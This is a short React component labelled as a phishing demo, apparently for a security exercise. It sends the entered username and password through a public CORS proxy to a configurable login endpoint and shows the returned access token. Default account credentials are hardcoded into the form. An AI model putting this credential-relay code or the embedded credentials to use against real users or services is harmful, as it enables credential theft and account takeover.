import React from 'react'

export default function Phishing() {
  const [url, setUrl] = React.useState('')

  async function handleSubmit(e) {
    e.preventDefault()
    const response = await fetch(`https://cors-anywhere.herokuapp.com/${url}`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: (document.getElementById('username') as HTMLInputElement).value,
        password: (document.getElementById('password') as HTMLInputElement).value,
      }),
    })
      .then((res) => res.json())
      .catch(() => window.alert('That did not work.'))

    if (response?.access_token) window.alert(`Gotcha. ${response.access_token}`)
  }

  return (
    <main>
      <h1>Phishing Demo</h1>
      <p>
        This is a mock phishing site to collect user credentials. Submitting the form will send a POST request with
        `username` and `password` (JSON) to the Login-URL (e.g. https://skinny.beyondshop.cloud/cockpit/api/auth/login).
      </p>
      <label>
        Login-URL:
        <input value={url} onChange={(e) => setUrl(e.target.value)}></input>
      </label>
      <form onSubmit={handleSubmit}>
        <label>
          Username:
          <input name="username" id="username" value="teamcrimson"></input>
        </label>
        <label>
          Password:
          <input name="password" id="password" value="ePages01"></input>
        </label>
        <button>Submit</button>
      </form>
    </main>
  )
}
